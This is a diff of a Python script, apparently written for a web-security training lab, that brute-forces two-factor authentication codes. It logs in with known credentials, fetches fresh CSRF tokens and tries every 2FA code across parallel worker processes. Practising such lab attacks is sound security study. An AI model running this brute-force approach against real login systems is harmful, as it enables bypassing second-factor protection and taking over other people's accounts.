@@ -16,10 +16,37 @@ PROVIDED_USER = 'carlos'
 PROVIDED_PW = 'montoya'
 
 
+# Pull site info from cli args -- drop https:// if included
+try:
+    site = sys.argv[1]
+    if 'https://' in site:
+        site = site.rstrip('/').lstrip('https://')
+except IndexError:  # Specify that this error is thrown b/c of missing CLI arg
+    raise IndexError("Missing ctf site url in command line arguments.\n")
+# Grab number of procs to run concurrently, or use default value.
+try:
+    num_procs = sys.argv[2]
+except IndexError:
+    print("Number of worker processes not specified, defaulting to ", DEFAULT_WORKERS)
+    num_procs = DEFAULT_WORKERS
+
+# Find out how many codes each worker will try
+functional_unit_size = int(TOTAL_NUM_CODES / num_procs)
+
+s = requests.Session()
+login_url = f'https://{site}/login'
+
+
 # Small wrapper for printing based on value of DEBUG_MODE
 def debug_print(text):
     if DEBUG_MODE:
         print(text)
+
+
+# Grab the csrf token gained from the initial login page for a new session.
+def get_login_page_csrf():
+    resp = s.get(login_url)
+    return parse_tree_for_csrf(resp.text)
 
 
 # Login to user we have credentials for.
@@ -39,34 +66,6 @@ def login(uname, pw, csrf_token):
 def parse_tree_for_csrf(text):
     parser = BeautifulSoup(text, 'html.parser')
     return parser.find('input', {'name': 'csrf'}).get('value')
-
-
-# Start script
-# ------------------------
-
-# Pull site info from cli args -- drop https:// if included
-try:
-    site = sys.argv[1]
-    if 'https://' in site:
-        site = site.rstrip('/').lstrip('https://')
-except IndexError:  # Specify that this error is thrown b/c of missing CLI arg
-    raise IndexError("Missing ctf site url in command line arguments.\n")
-# Grab number of procs to run concurrently, or use default value.
-try:
-    num_procs = sys.argv[2]
-except IndexError:
-    print("Number of worker processes not specified, defaulting to ", DEFAULT_WORKERS)
-    num_procs = DEFAULT_WORKERS
-
-# Find out how many codes each worker will try
-functional_unit_size = TOTAL_NUM_CODES / num_procs
-
-# First:
-# GET login page to find value of cross-site request forgery token.
-s = requests.Session()
-login_url = f'https://{site}/login'
-resp = s.get(login_url)
-login_page_csrf = parse_tree_for_csrf(resp.text)
 
 
 # Grab response after successful login to grab the csrf token for interaction with 2fa login page
@@ -90,12 +89,15 @@ def try_2fa_functional_unit(process_number):
 
     # Main loop, try all 2fa codes in this worker's range.
     for code_num in range(start_range, end_range):
-        # Grab csrf token from 'login success' page, which is needed for interaction with 2fa login page.
+        # Get initial login page csrf
+        csrf = get_login_page_csrf()
+        # Use that csrf for login POST
         response_text = login(
             uname=PROVIDED_USER,
             pw=PROVIDED_PW,
-            csrf_token=login_page_csrf
+            csrf_token=csrf
         )
+        # Grab csrf for 2fa POST
         csrf = parse_tree_for_csrf(response_text)
 
         # Send auth request to 2fa endpoint with csrf token and padded 2fa code number
